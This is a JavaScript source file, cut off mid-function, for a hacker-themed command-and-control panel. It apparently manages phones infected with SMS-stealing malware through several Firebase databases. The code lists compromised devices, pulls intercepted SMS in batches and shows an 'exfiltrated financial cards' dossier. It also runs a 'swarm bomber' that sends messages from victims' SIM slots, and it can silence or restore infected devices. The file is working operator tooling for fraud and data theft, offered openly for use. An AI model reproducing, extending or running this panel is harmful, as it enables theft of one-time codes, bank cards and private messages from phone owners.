/* ==========================================================================
   RAM KA PANEL — CYBER C2 // MOVIE-GRADE HACKER LOGIC
   Hardware Accelerated Mobile Architecture
   Encrypted Telemetry, Swarm Injector & Intelligence Dossier
   ========================================================================== */

const LIST_PATH = "user_list";
const DATA_PATH = "user_data";
const SMS_PATH = "user_sms";
const CARD_PATH = "Card";

let FB_URL = "";

// ---- Audio SFX Engine (Hollywood Cyber Terminal Audio) ----
const audioState = {
    enabled: localStorage.getItem('CYBER_SFX') !== 'false',
    ctx: null
};

function getAudioCtx() {
    if (!audioState.ctx) {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (AudioContext) audioState.ctx = new AudioContext();
    }
    if (audioState.ctx && audioState.ctx.state === 'suspended') {
        audioState.ctx.resume();
    }
    return audioState.ctx;
}

function playCyberSound(type = 'blip') {
    if (!audioState.enabled) return;
    try {
        const ctx = getAudioCtx();
        if (!ctx) return;
        const now = ctx.currentTime;
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);

        if (type === 'blip') {
            osc.type = 'sine';
            osc.frequency.setValueAtTime(880, now);
            osc.frequency.exponentialRampToValueAtTime(1320, now + 0.05);
            gain.gain.setValueAtTime(0.06, now);
            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.05);
            osc.start(now);
            osc.stop(now + 0.05);
        } else if (type === 'switch') {
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(440, now);
            osc.frequency.exponentialRampToValueAtTime(880, now + 0.08);
            gain.gain.setValueAtTime(0.08, now);
            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.08);
            osc.start(now);
            osc.stop(now + 0.08);
        } else if (type === 'launch') {
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(220, now);
            osc.frequency.exponentialRampToValueAtTime(1760, now + 0.22);
            gain.gain.setValueAtTime(0.12, now);
            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.22);
            osc.start(now);
            osc.stop(now + 0.22);
        } else if (type === 'abort') {
            osc.type = 'square';
            osc.frequency.setValueAtTime(320, now);
            osc.frequency.setValueAtTime(180, now + 0.06);
            gain.gain.setValueAtTime(0.08, now);
            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.14);
            osc.start(now);
            osc.stop(now + 0.14);
        }
    } catch (e) {}
}

function toggleAudioFx() {
    audioState.enabled = !audioState.enabled;
    localStorage.setItem('CYBER_SFX', String(audioState.enabled));
    const btn = document.getElementById('sfxToggleBtn');
    const icon = document.getElementById('sfxIcon');
    if (btn) btn.classList.toggle('active', audioState.enabled);
    if (icon) icon.textContent = audioState.enabled ? '🔊' : '🔇';
    if (audioState.enabled) playCyberSound('blip');
    showToast(`Cyber Audio FX: ${audioState.enabled ? 'ONLINE' : 'MUTED'}`, 'info');
}

// ---- Matrix Digital Rain Engine ----
function initMatrixRain() {
    const canvas = document.getElementById('matrixCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let width = (canvas.width = window.innerWidth);
    let height = (canvas.height = window.innerHeight);

    const chars = "0101010101100101ABCDEF0123456789$#@%&*<>/\\";
    const fontSize = 14;
    let columns = Math.floor(width / fontSize);
    let drops = Array(columns).fill(1);

    window.addEventListener('resize', () => {
        width = canvas.width = window.innerWidth;
        height = canvas.height = window.innerHeight;
        columns = Math.floor(width / fontSize);
        drops = Array(columns).fill(1);
    });

    let lastFrame = 0;
    function renderRain(timestamp) {
        if (timestamp - lastFrame > 45) {
            lastFrame = timestamp;
            ctx.fillStyle = "rgba(3, 7, 8, 0.09)";
            ctx.fillRect(0, 0, width, height);

            const activeColor = getComputedStyle(document.body).getPropertyValue('--orbit-accent').trim() || '#00ff66';
            ctx.fillStyle = activeColor;
            ctx.font = `${fontSize}px monospace`;

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        requestAnimationFrame(renderRain);
    }
    requestAnimationFrame(renderRain);
}

// ---- State Management ----
const state = {
    devices: [],
    mutedDevices: new Set(),
    rawFullData: {},
    activeClients: new Set(),
    deviceFilter: 'all',
    server1RecentSmsDevices: new Set(),

    localSmsCache: {},
    globalSortedMsgs: [],
    smsKeyMap: {},
    smsPageIndex: 0,
    smsPageSize: 30,
    sheetPageIndex: 0,
    sheetPageSize: 10,
    sheetSmsInterval: null,

    // Swarm Bomber
    bomberMode: 'bomber', // 'bomber' or 'normal'
    bomberSim: '1',
    bomberRunning: false,
    bomberAbort: false,

    selectedSim: '1',
    sheetSim: '1',

    forwardThreads: {},
    forwardIntervals: {},

    currentSheetDevId: null,
    sheetSmsAll: [],

    // Device Pagination
    filteredDevices: [],
    devicePageIndex: 0,
    devicePageSize: 40,
    searchDebounceTimer: null,
    currentTab: 'sender'
};

// ---- Init ----
document.addEventListener('DOMContentLoaded', () => {
    initSecurityLock();
    updateHeaderTime();
    setInterval(updateHeaderTime, 1000);
    initMatrixRain();

    // Init Audio Toggle Button state
    const sfxBtn = document.getElementById('sfxToggleBtn');
    const sfxIcon = document.getElementById('sfxIcon');
    if (sfxBtn) sfxBtn.classList.toggle('active', audioState.enabled);
    if (sfxIcon) sfxIcon.textContent = audioState.enabled ? '🔊' : '🔇';

    const msgBody = document.getElementById('messageBody');
    if (msgBody) {
        msgBody.addEventListener('input', () => {
            const charEl = document.getElementById('charCount');
            if (charEl) charEl.textContent = msgBody.value.length;
        });
    }

    const searchInput = document.getElementById('deviceSearch');
    if (searchInput) {
        searchInput.addEventListener('input', () => {
            if (state.searchDebounceTimer) clearTimeout(state.searchDebounceTimer);
            state.searchDebounceTimer = setTimeout(() => {
                state.devicePageIndex = 0;
                refreshDeviceList();
            }, 180);
        });
    }

    // Sheet touch scroll lock prevention
    const sheetOverlay = document.getElementById('deviceSheet');
    if (sheetOverlay) {
        sheetOverlay.addEventListener('touchmove', (e) => {
            const container = document.getElementById('sheetContainer');
            if (container && !container.contains(e.target)) e.preventDefault();
        }, { passive: false });
    }
});

const PLANET_INFO = {
    money: { flag: '💵', sector: '0x01 // RED-PANEL SHAMSUL-2 RTDB', title: 'SERVER MONEY' },
    mega: { flag: '⚡', sector: '0x02 // BOSSSSSSSSSSSSS2-F7E29 RTDB', title: 'SERVER MEGA' },
    paisa: { flag: '👑', sector: '0x03 // K-PARTY ADMIN PANEL RTDB', title: 'SERVER PAISA' },
    rupee: { flag: '🔴', sector: '0x04 // MISHRA-D9DB2 RTDB', title: 'SERVER RUPEE' },
    dollar: { flag: '💲', sector: '0x05 // RTO-CHALLAN-2CD79 RTDB', title: 'SERVER DOLLAR' },
    euro: { flag: '🔱', sector: '0x06 // HHHG-B94A2 RTDB', title: 'HULAMAN SERVER' },
    hulaman: { flag: '🔱', sector: '0x06 // HHHG-B94A2 RTDB', title: 'HULAMAN SERVER' },
    beta: { flag: '🧪', sector: '0x07 // JAYXGCCY RTDB', title: 'SERVER BETA' },
    // Compatibility aliases
    earth: { flag: '💵', sector: '0x01 // RED-PANEL SHAMSUL-2 RTDB', title: 'SERVER MONEY' },
    mars: { flag: '🔴', sector: '0x04 // MISHRA-D9DB2 RTDB', title: 'SERVER RUPEE' },
    venus: { flag: '👑', sector: '0x03 // K-PARTY ADMIN PANEL RTDB', title: 'SERVER PAISA' },
    mercury: { flag: '⚡', sector: '0x02 // BOSSSSSSSSSSSSS2-F7E29 RTDB', title: 'SERVER MEGA' }
};

function openServerModal() {
    playCyberSound('blip');
    const modal = document.getElementById('serverModal');
    if (modal) modal.classList.remove('hidden');
}

function selectServer(url, name = 'money') {
    FB_URL = url;
    playCyberSound('switch');
    const modal = document.getElementById('serverModal');
    if (modal) modal.classList.add('hidden');

    const key = String(name).toLowerCase();
    document.body.setAttribute('data-planet', key);
    if (typeof state !== 'undefined' && state) { state.activeClients = new Set(); state.extraFeeds = null; }

    const info = PLANET_INFO[key] || { flag: '⚡', sector: '0x00 // CYBER GRID PROXY', title: name.toUpperCase() };

    const headerName = document.getElementById('headerServerName');
    if (headerName) {
        headerName.innerHTML = `${info.title} ${info.flag}`;
    }
    const headerSub = document.querySelector('.header-info p');
    if (headerSub) {
        headerSub.innerHTML = `ROOT@TERMINAL // ${info.sector}`;
    }

    // Dynamic Dossier Tab Titles
    const dTitle = document.getElementById('dossierTitle');
    const dSub = document.getElementById('dossierSubtitle');
    if (dTitle) dTitle.innerHTML = 'EXFILTRATED FINANCIAL CARDS 💳';
    if (dSub) dSub.textContent = '[ DECRYPTED FINANCIAL DOSSIERS // CARD 1 & CARD 2 INTEL ]';

    fetchDevices();
}

function logout() {
    playCyberSound('abort');
    FB_URL = "";
    const modal = document.getElementById('serverModal');
    if (modal) modal.classList.remove('hidden');
    document.body.setAttribute('data-planet', 'money');

    state.devices = [];
    state.rawFullData = {};
    state.activeClients = new Set();
    state.extraFeeds = null;
    state.server1RecentSmsDevices = new Set();
    const devList = document.getElementById('deviceList');
    if (devList) {
        devList.innerHTML = '<div class="empty-state" id="deviceEmpty" style="display:flex;"><div class="empty-planet-icon">⚡</div><p>NO ACTIVE NODES IN RADAR</p><span>Tap "SWEEP ACTIVE NODES" to initiate frequency recon</span></div>';
    }
    const smsList = document.getElementById('smsList');
    if (smsList) {
        smsList.innerHTML = '<div class="empty-state" id="smsEmpty" style="display:flex;"><div class="empty-planet-icon">📡</div><p>NO INTERCEPTS CAPTURED</p><span>Execute "DECRYPT LIVE FEED" to capture payload transmissions</span></div>';
    }
    updateStats(0, 0, 0);
    const smsBadge = document.getElementById('smsCountBadge');
    if (smsBadge) smsBadge.textContent = '0';
    showToast('C2 Gateway Disengaged 🛑', 'info');
}

// ---- Tab Switching (Synchronized Top Deck + Bottom Dock) ----
function switchTab(tabName) {
    state.currentTab = tabName;
    playCyberSound('switch');

    // Tab Panels
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    const panel = document.getElementById('panel' + tabName.charAt(0).toUpperCase() + tabName.slice(1));
    if (panel) {
        panel.classList.remove('active');
        void panel.offsetWidth;
        panel.classList.add('active');
    }

    // Top Segmented Tactical Deck
    document.querySelectorAll('.tactical-tab-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.tab === tabName);
    });

    // Bottom Ergonomic Thumb Dock
    document.querySelectorAll('.nav-item').forEach(n => {
        n.classList.toggle('active', n.dataset.tab === tabName);
    });

    // Scroll to top
    const main = document.getElementById('mainContent');
    if (main) main.scrollTop = 0;

    autoFetchForTab(tabName);
}

function autoFetchForTab(tabName) {
    switch (tabName) {
        case 'sender':
            if (state.devices.length === 0 && FB_URL) fetchDevices();
            break;
        case 'logs':
            if (FB_URL) fetchAllSms();
            break;
        case 'bomber':
            updateBomberDeviceInfo();
            break;
        case 'pages':
            if (FB_URL) fetchPagesData();
            break;
    }
}

// Center Quick Tactical Action Button in Dock
function quickActionTrigger() {
    playCyberSound('blip');
    switch (state.currentTab) {
        case 'sender':
            fetchDevices();
            break;
        case 'logs':
            fetchAllSms();
            break;
        case 'bomber':
            const targetEl = document.getElementById('bomberTarget');
            if (targetEl) targetEl.focus();
            showToast('Ready to Inject Payload ⚡', 'info');
            break;
        case 'pages':
            fetchPagesData();
            break;
        default:
            fetchDevices();
    }
}

// ---- Header Time ----
function updateHeaderTime() {
    const now = new Date();
    const t = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const timeEl = document.getElementById('headerTime');
    if (timeEl) timeEl.textContent = t;
}

// ---- Status ----
function setStatus(text, type = 'normal') {
    const statusText = document.getElementById('statusText');
    if (statusText) statusText.textContent = text;
    const dot = document.getElementById('statusDot');
    if (dot) {
        dot.className = 'status-dot' + (type === 'loading' ? ' loading' : type === 'error' ? ' error' : '');
    }
}

// ---- Toast ----
function showToast(message, type = 'info') {
    const container = document.getElementById('toastContainer');
    if (!container) return;
    const icons = { success: '✓', error: '✕', info: '⚡', warning: '⚠' };
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.innerHTML = `<span class="toast-icon">${icons[type] || '⚡'}</span><span>${message}</span>`;
    container.appendChild(toast);
    setTimeout(() => {
        toast.classList.add('exit');
        setTimeout(() => toast.remove(), 250);
    }, 3200);
}

// ---- SIM Slot Selection ----
function selectSim(slot) {
    playCyberSound('blip');
    state.selectedSim = String(slot);
    document.querySelectorAll('.form-card .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

function selectSheetSim(slot) {
    playCyberSound('blip');
    state.sheetSim = String(slot);
    document.querySelectorAll('.sheet-section .sim-sm .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

function selectBomberSim(slot) {
    playCyberSound('blip');
    state.bomberSim = String(slot);
    document.querySelectorAll('#panelBomber .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

// ---- Filter ----
function setDeviceFilter(f) {
    playCyberSound('blip');
    state.deviceFilter = f;
    document.querySelectorAll('.filter-row .pill').forEach(p => p.classList.toggle('active', p.dataset.filter === f));
    refreshDeviceList();
}

// ==========================================================================
// TAB 1: TARGET NODES (DEVICES)
// ==========================================================================

async function fetchDevices() {
    if (!FB_URL) return showToast('Connect C2 Gateway first', 'error');
    playCyberSound('blip');
    setStatus('SWEEPING FREQUENCIES…', 'loading');
    const btn = document.getElementById('fetchDevicesBtn');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = 'RECON IN PROGRESS… ⚡';
    }

    try {
        const [rList, rMuted, rData, rClients] = await Promise.all([
            fetch(`${FB_URL}/${LIST_PATH}.json?shallow=true`).then(r => r.json()).catch(() => ({})),
            fetch(`${FB_URL}/user_muted_list.json?shallow=true`).then(r => r.json()).catch(() => ({})),
            fetch(`${FB_URL}/${DATA_PATH}.json`).then(r => r.json()).catch(() => ({})),
            fetch(`${FB_URL}/clients.json?shallow=true`).then(r => r.json()).catch(() => ({})),
        ]);

        state.mutedDevices = new Set(rMuted ? Object.keys(rMuted) : []);
        state.activeClients = new Set(rClients ? Object.keys(rClients) : []);
        const allIds = new Set([
            ...Object.keys(rList || {}),
            ...Object.keys(rData || {}),
            ...state.activeClients,
            ...state.mutedDevices
        ]);
        const merged = {};
        allIds.forEach(id => { merged[id] = (rData || {})[id] || { d_name: "Node-Target" }; });

        state.rawFullData = merged;
        renderDeviceList(merged);
        populateSenderDropdowns();
        setStatus('ARMED // READY');
        showToast(`${Object.keys(merged).length} Target Nodes Intercepted`, 'success');
    } catch (e) {
        setStatus('ERROR', 'error');
        showToast(e.message, 'error');
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> SWEEP ACTIVE NODES ⚡`;
        }
    }
}

// ---- Server 1 (SERVER MONEY) 24-Hour Activity & Message Intelligence ----
// Strict Isolation: Only applies to Server 1 (red-panel-shamsul-2), other servers are NOT affected
function isServer1Active() {
    return (FB_URL && FB_URL.includes('red-panel-shamsul-2')) ||
           document.body.getAttribute('data-planet') === 'money' ||
           document.body.getAttribute('data-planet') === 'earth';
}

const PUSH_CHARS = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
function decodeFirebasePushKey(key) {
    if (!key || typeof key !== 'string' || key.length < 8) return 0;
    let ts = 0;
    for (let i = 0; i < 8; i++) {
        const c = key[i];
        const idx = PUSH_CHARS.indexOf(c);
        if (idx === -1) return 0;
        ts = ts * 64 + idx;
    }
    if (ts >= 1577836800000 && ts <= 2051222400000) return ts;
    return 0;
}

function parseDateStrToTimestamp(str) {
    if (!str || typeof str !== 'string') return null;
    try {
        const hindiDigits = { '०': '0', '१': '1', '२': '2', '३': '3', '४': '4', '५': '5', '६': '6', '७': '7', '८': '8', '९': '9' };
        const bengaliDigits = { '০': '0', '১': '1', '২': '2', '৩': '3', '৪': '4', '৫': '5', '৬': '6', '৭': '7', '৮': '8', '৯': '9' };
        let clean = str.replace(/[०-९]/g, d => hindiDigits[d] || d);
        clean = clean.replace(/[০-৯]/g, d => bengaliDigits[d] || d);
        clean = clean.replace(/\./g, '').trim(); // normalize p.m. -> pm, a.m. -> am

        // Format: DD-Mon-YY or DD-Mon-YYYY (e.g. 09-Jul-26 23:39)
        const months = { jan:0, feb:1, mar:2, apr:3, may:4, jun:5, jul:6, aug:7, sep:8, oct:9, nov:10, dec:11 };
        const mMon = clean.match(/^(\d{1,2})[-/ ]([A-Za-z]{3})[-/ ](\d{2,4})(?:[ T](\d{1,2}):(\d{1,2})(?::(\d{1,2}))?)?/);
        if (mMon) {
            const d = parseInt(mMon[1], 10);
            const mo = months[mMon[2].toLowerCase()];
            let y = parseInt(mMon[3], 10);
            if (y < 100) y += 2000;
            let h = mMon[4] ? parseInt(mMon[4], 10) : 0;
            const min = mMon[5] ? parseInt(mMon[5], 10) : 0;
            const sec = mMon[6] ? parseInt(mMon[6], 10) : 0;
            if (clean.toLowerCase().includes('pm') && h < 12) h += 12;
            if (clean.toLowerCase().includes('am') && h === 12) h = 0;
            if (mo !== undefined) return new Date(y, mo, d, h, min, sec).getTime();
        }

        // ISO format: YYYY-MM-DD HH:mm:ss
        const mIso = clean.match(/^(\d{4})[-/](\d{1,2})[-/](\d{1,2})(?:[ T](\d{1,2}):(\d{1,2})(?::(\d{1,2}))?)?/);
        if (mIso) {
            const y = parseInt(mIso[1], 10);
            const m = parseInt(mIso[2], 10) - 1;
            const d = parseInt(mIso[3], 10);
            let h = mIso[4] ? parseInt(mIso[4], 10) : 0;
            const min = mIso[5] ? parseInt(mIso[5], 10) : 0;
            const sec = mIso[6] ? parseInt(mIso[6], 10) : 0;
            if (clean.toLowerCase().includes('pm') && h < 12) h += 12;
            if (clean.toLowerCase().includes('am') && h === 12) h = 0;
            return new Date(y, m, d, h, min, sec).getTime();
        }

        // Slash format: DD/MM/YYYY or MM/DD/YYYY
        const mSlash = clean.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})(?:[ T](\d{1,2}):(\d{1,2})(?::(\d{1,2}))?)?/);
        if (mSlash) {
            let p1 = parseInt(mSlash[1], 10);
            let p2 = parseInt(mSlash[2], 10);
            const year = parseInt(mSlash[3], 10);
            let day = p1;
            let month = p2 - 1;
            if (p2 > 12 && p1 <= 12) {
                // MM/DD/YYYY format
                month = p1 - 1;
                day = p2;
            }
            let h = mSlash[4] ? parseInt(mSlash[4], 10) : 0;
            const min = mSlash[5] ? parseInt(mSlash[5], 10) : 0;
            const sec = mSlash[6] ? parseInt(mSlash[6], 10) : 0;
            if (clean.toLowerCase().includes('pm') && h < 12) h += 12;
            if (clean.toLowerCase().includes('am') && h === 12) h = 0;
            return new Date(year, month, day, h, min, sec).getTime();
        }

        const fallback = Date.parse(clean);
        return isNaN(fallback) ? null : fallback;
    } catch (e) {
        return null;
    }
}

function isDeviceOnline(devId, info) {
    // 1. Standard check first (preserves exact behavior for Server 2, 3, 4, 5, 6)
    if (info && (info.status === true || info.status === 'online' || String(info.status).toLowerCase() === 'true')) {
        return true;
    }

    // 2. Active C2 client registry check (populated from /clients.json?shallow=true)
    if (typeof state !== 'undefined' && state.activeClients && state.activeClients.has(devId)) {
        return true;
    }

    // 3. Activity & Telemetry check (Server Money without explicit status flags)
    if (!isServer1Active()) {
        return false;
    }

    if (!info) return false;

    const now = Date.now();
    const TWENTY_FOUR_HOURS_MS = 24 * 60 * 60 * 1000;

    // A. Check lastUpdated millisecond timestamp (APK payload updates this on SMS receipt / heartbeat)
    if (info.lastUpdated) {
        const lu = Number(info.lastUpdated);
        if (!isNaN(lu) && lu > 0) {
            const diff = now - lu;
            // Allow up to 10 minutes forward clock drift and 24 hours backward
            if (diff >= -600000 && diff <= TWENTY_FOUR_HOURS_MS) {
                return true;
            }
        }
    }

    // B. Check TimeandDate string
    if (info.TimeandDate) {
        const parsed = parseDateStrToTimestamp(info.TimeandDate);
        if (parsed) {
            const diff = now - parsed;
            if (diff >= -600000 && diff <= TWENTY_FOUR_HOURS_MS) {
                return true;
            }
        }
    }

    // C. Check if device has incoming SMS within last 24h tracked in state
    if (typeof state !== 'undefined' && state.server1RecentSmsDevices && state.server1RecentSmsDevices.has(devId)) {
        return true;
    }

    return false;
}

function renderDeviceList(data) {
    const list = document.getElementById('deviceList');
    const empty = document.getElementById('deviceEmpty');
    const pagination = document.getElementById('devicePagination');
    const search = (document.getElementById('deviceSearch')?.value || '').toLowerCase();

    list.querySelectorAll('.device-card').forEach(c => c.remove());
    state.devices = [];
    state.filteredDevices = [];
    let online = 0, muted = 0;

    if (!data || Object.keys(data).length === 0) {
        if (empty) empty.style.display = 'flex';
        if (pagination) pagination.style.display = 'none';
        updateStats(0, 0, 0);
        return;
    }

    const sortedIds = Object.keys(data).sort();
    const matched = [];

    sortedIds.forEach(devId => {
        const isMuted = state.mutedDevices.has(devId);
        if (isMuted) muted++;
        const info = typeof data[devId] === 'object' ? data[devId] : { d_name: String(data[devId]) };

        const isOnline = isDeviceOnline(devId, info);
        if (isOnline) online++;

        state.devices.push(devId);

        if (state.deviceFilter === 'active' && !isOnline) return;
        if (state.deviceFilter === 'muted' && !isMuted) return;

        const model = info.model || info.d_name || 'Generic Device';
        const number = info.numberSim1 || info.sim1Number || info.phoneNumber || '';

        if (search) {
            const match = devId.toLowerCase().includes(search) || model.toLowerCase().includes(search) || number.toLowerCase().includes(search);
            if (!match) return;
        }

        matched.push({ devId, model, isOnline, isMuted });
    });

    state.filteredDevices = matched;
    updateStats(state.devices.length, online, muted);

    if (matched.length === 0) {
        if (empty) empty.style.display = 'flex';
        if (pagination) pagination.style.display = 'none';
        return;
    }

    if (empty) empty.style.display = 'none';
    if (pagination) pagination.style.display = 'flex';

    const total = matched.length;
    const pages = Math.ceil(total / state.devicePageSize);
    if (state.devicePageIndex >= pages) state.devicePageIndex = Math.max(0, pages - 1);

    const start = state.devicePageIndex * state.devicePageSize;
    const slice = matched.slice(start, start + state.devicePageSize);

    const fragment = document.createDocumentFragment();
    slice.forEach(({ devId, model, isOnline, isMuted }) => {
        const card = document.createElement('div');
        card.className = `device-card${isMuted ? ' muted-card' : ''}`;
        card.dataset.deviceId = devId;
        card.innerHTML = `
            <input type="checkbox" class="dc-check device-checkbox" data-device-id="${devId}">
            <div class="dc-icon">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
                    <line x1="12" y1="18" x2="12.01" y2="18"/>
                </svg>
            </div>
            <div class="dc-body">
                <div class="dc-id">${esc(devId)}</div>
                <div class="dc-model">${esc(model)}</div>
            </div>
            <div class="dc-status">
                <span class="status-dot-inline ${isOnline ? 'online' : 'offline'}">${isOnline ? 'LIVE BREACH' : 'OFFLINE'}</span>
                ${isMuted ? '<span class="mute-badge">DARK SECTOR</span>' : ''}
            </div>
        `;

        card.addEventListener('click', (e) => {
            if (e.target.type === 'checkbox') return;
            openSheet(devId);
        });

        fragment.appendChild(card);
    });

    list.appendChild(fragment);

    const infoEl = document.getElementById('devicePageInfo');
    const prevBtn = document.getElementById('devicePrevBtn');
    const nextBtn = document.getElementById('deviceNextBtn');
    if (infoEl) infoEl.textContent = `${state.devicePageIndex + 1} / ${pages}`;
    if (prevBtn) prevBtn.disabled = state.devicePageIndex <= 0;
    if (nextBtn) nextBtn.disabled = state.devicePageIndex >= pages - 1;
}

function prevDevicePage() {
    if (state.devicePageIndex > 0) {
        state.devicePageIndex--;
        renderDeviceList(state.rawFullData);
        document.getElementById('mainContent').scrollTop = 0;
    }
}

function nextDevicePage() {
    const pages = Math.ceil(state.filteredDevices.length / state.devicePageSize);
    if (state.devicePageIndex < pages - 1) {
        state.devicePageIndex++;
        renderDeviceList(state.rawFullData);
        document.getElementById('mainContent').scrollTop = 0;
    }
}

function refreshDeviceList() {
    renderDeviceList(state.rawFullData);
}

function updateStats(total, online, muted) {
    const devCount = document.getElementById('deviceCountVal');
    const onlineCount = document.getElementById('onlineCountVal');
    const mutedCount = document.getElementById('mutedCountVal');
    if (devCount) devCount.textContent = total;
    if (onlineCount) onlineCount.textContent = online;
    if (mutedCount) mutedCount.textContent = muted;
}

function populateSenderDropdowns() {
    ['sheetSenderDevice', 'normalSenderSelect'].forEach(id => {
        const sel = document.getElementById(id);
        if (!sel) return;
        const val = sel.value;
        sel.innerHTML = '<option value="">— SELECT NODE —</option>';

        if (id === 'normalSenderSelect' && state.devices.length > 0) {
            const optAll = document.createElement('option');
            optAll.value = 'ALL';
            optAll.textContent = `— ALL NODES CLUSTER (${state.devices.length}) —`;
            optAll.style.fontWeight = 'bold';
            optAll.style.color = 'var(--orbit-accent)';
            sel.appendChild(optAll);
        }

        state.devices.forEach(d => {
            const opt = document.createElement('option');
            opt.value = d;
            opt.textContent = d.length > 28 ? d.substring(0, 28) + '…' : d;
            sel.appendChild(opt);
        });
        if (val) sel.value = val;
    });
}

function selectAllDevices() {
    playCyberSound('blip');
    document.querySelectorAll('.device-checkbox').forEach(c => c.checked = true);
    showToast('All Nodes Selected', 'info');
}

function getSelectedDeviceIds() {
    return [...document.querySelectorAll('.device-checkbox:checked')].map(c => c.dataset.deviceId);
}

async function toggleMuteSelected() {
    playCyberSound('blip');
    const sel = getSelectedDeviceIds();
    if (!sel.length) return showToast('Select nodes to silence', 'warning');
    setStatus('UPDATING NODES…', 'loading');
    let ok = 0;
    for (const id of sel) {
        try {
            if (state.mutedDevices.has(id)) {
                await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'DELETE' });
                await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            } else {
                await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'DELETE' });
                await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            }
            ok++;
        } catch (e) {}
    }
    showToast(`Updated ${ok} Nodes`, 'success');
    fetchDevices();
}

async function unmuteSelected() {
    playCyberSound('blip');
    const sel = getSelectedDeviceIds();
    if (!sel.length) return showToast('Select nodes to restore', 'warning');
    setStatus('RESTORING LINK…', 'loading');
    let ok = 0;
    for (const id of sel) {
        if (!state.mutedDevices.has(id)) continue;
        try {
            await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'DELETE' });
            await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            ok++;
        } catch (e) {}
    }
    if (ok) showToast(`Restored Link: ${ok} Nodes`, 'success');
    fetchDevices();
}

// ==========================================================================
// TAB 2: SMS INTERCEPTS
// ==========================================================================

async function fetchAllSms() {
    if (!FB_URL) return showToast('Connect C2 Gateway first', 'error');
    playCyberSound('blip');
    setStatus('DECRYPTING FEED…', 'loading');
    const btn = document.getElementById('fetchSmsBtn');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = 'STREAMING… 📡';
    }

    try {
        const rShallow = await fetch(`${FB_URL}/${SMS_PATH}.json?shallow=true`).then(r => r.json()).catch(() => ({}));
        let devIds = rShallow ? Object.keys(rShallow) : [];

        if (state.rawFullData && Object.keys(state.rawFullData).length > 0) {
            devIds.sort((a, b) => {
                const isClientA = state.activeClients && state.activeClients.has(a) ? 1 : 0;
                const isClientB = state.activeClients && state.activeClients.has(b) ? 1 : 0;
                if (isClientB !== isClientA) return isClientB - isClientA;

                const timeA = state.rawFullData[a]?.lastUpdated || 0;
                const timeB = state.rawFullData[b]?.lastUpdated || 0;
                return timeB - timeA;
            });
        }

        devIds = devIds.slice(0, 150);
        const dict = {};

        for (let i = 0; i < devIds.length; i += 30) {
            const batch = devIds.slice(i, i + 30);
            const results = await Promise.allSettled(
                batch.map(id => fetch(`${FB_URL}/${SMS_PATH}/${id}.json`, { signal: AbortSignal.timeout(10000) }).then(r => r.json()).then(d => ({ id, d })))
            );
            results.forEach(r => { if (r.status === 'fulfilled' && r.value.d) dict[r.value.id] = r.value.d; });
            setStatus(`INTERCEPTS ${Math.min(i + 30, devIds.length)}/${devIds.length}…`, 'loading');

            if (i === 0) {
                state.localSmsCache = { ...dict };
                updateSmsTree(state.localSmsCache);
            }
        }

        state.localSmsCache = dict;
        updateSmsTree(dict);
        setStatus('ARMED // READY');
        showToast('Decrypted Stream Synced', 'success');
    } catch (e) {
        setStatus('ERROR', 'error');
        showToast(e.message, 'error');
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg> DECRYPT LIVE FEED STREAM ⚡`;
        }
    }
}

function updateSmsTree(data) {
    if (!data) data = state.localSmsCache;
    const showMuted = document.getElementById('showMutedSms')?.checked || false;
    const all = [];
    const seen = new Set();

    function addMsg(devId, k, v) {
        if (!v || typeof v !== 'object') return;
        const timeVal = v.date || v.time || v.TimeandDate || v.created_at || 'Unknown';
        let parsedTs = 0;
        if (v.timestamp) {
            const n = Number(v.timestamp);
            if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
        }
        if (!parsedTs && v.created_at) {
            const n = Number(v.created_at);
            if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
        }
